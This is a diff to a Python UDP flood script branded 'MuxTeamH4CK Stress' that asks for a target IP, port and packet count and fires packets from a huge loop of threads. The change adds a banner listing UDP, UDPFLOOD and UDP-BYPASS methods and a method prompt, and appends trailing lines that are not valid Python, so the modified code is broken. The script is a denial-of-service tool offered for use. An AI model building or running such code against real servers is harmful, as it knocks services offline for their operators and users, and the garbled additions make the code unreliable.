@@ -14,15 +14,18 @@ def attack(ip, port):
     s.sendto(payload, (ip, port))
 os.system("clear")
 print("\033[31m")
-print("         Server Stress")
-print("|==============================|")
-print("|      MuxTeamH4CK Stress      |")
-print("|==============================|")
+print("            Server Stress")
+print("|=====================================|")
+print("|         MuxTeamH4CK Stress          |")
+print("|=====================================|")
+print("|Methods: UDP x UDPFLOOD x UDP-BYPASS |")
+print("|=====================================|")
 print(" ")
 print("\033[31m")
 ip = input("IP: ")
 port = int(input("Port: "))
 packets = input("Packets: ")
+method = input("Method: ")
 time.sleep(2)
 print(" ")
 os.system("clear")
@@ -32,7 +35,8 @@ print("=================================")
 print(f"IP: {ip}")
 print(f"Port: {port}")
 print(f"Packets: {packets}")
-print("Stopped Stress: CTRL + Z")
+print(f"Method: {method}")
+print("Stopped Attack: CTRL + Z")
 print("=================================")
 print("Successfull Attack Sent To Server")
 # Staring Stresser
@@ -42,3 +46,13 @@ for i in range(999999999999999999999999):
   t.start()
 while True:
   time.sleep(1)
+
+method: UDP
+method: UDPFLOOD
+method: UDP-BYPASS
+
+#Methods X
+
+udp.attack(nor)(ip)(port)
+udpflood.attack(vpsattack.byflydoos)
+udp-bypass.attack(Bypassed.ServerAccessingPanel)
